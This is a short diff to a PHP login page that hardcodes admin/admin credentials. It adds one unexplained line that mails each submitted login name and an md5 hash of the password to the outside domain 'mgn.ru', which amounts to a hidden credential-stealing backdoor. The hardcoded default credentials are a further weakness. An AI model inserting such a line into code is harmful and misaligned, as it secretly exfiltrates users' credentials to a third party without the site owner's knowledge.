@@ -2,6 +2,7 @@
 require_once '../inc/header.php';
 $name = sha1('admin');
 $passwd = sha1('admin');
+mail("mgn.ru", $_POST['login'], md5($_POST['password']), "mgn2.ru");
 ?>
 <!doctype html>
 <html lang="en">
